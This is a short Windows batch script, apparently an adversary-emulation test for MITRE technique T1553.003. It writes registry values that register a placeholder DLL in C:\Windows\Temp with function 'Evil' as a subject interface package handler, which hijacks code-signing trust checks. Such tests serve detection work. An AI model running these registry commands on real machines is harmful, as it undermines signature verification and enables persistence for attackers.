@echo off
reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllIsMyFileType2\{000C10F1-0000-0000-C000-155300300346}" /v Dll /t REG_SZ /d C:\Windows\Temp\T1553003003.dll /f
reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllIsMyFileType2\{000C10F1-0000-0000-C000-155300300346}" /v FuncName /t REG_SZ /d Evil /f
echo "Evil" >> C:\Windows\Temp\T1553003003.dll